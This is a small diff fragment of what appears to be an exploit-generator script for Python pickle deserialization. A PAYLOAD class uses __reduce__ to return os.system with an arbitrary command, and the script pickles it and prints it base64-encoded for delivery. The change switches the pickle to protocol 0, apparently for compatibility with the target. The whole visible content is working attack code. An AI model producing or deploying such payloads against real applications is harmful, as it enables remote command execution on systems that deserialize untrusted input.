@@ -18,7 +18,7 @@ class PAYLOAD():
 	def __reduce__(self):
 		return os.system, ("{}".format(command),)
 		
-b64Encoded = base64.b64encode(pickle.dumps(PAYLOAD())).decode("utf-8")
+b64Encoded = base64.b64encode(pickle.dumps(PAYLOAD(), protocol=0)).decode("utf-8")
 
 print("Payload (Base64) => {}".format(b64Encoded))
 
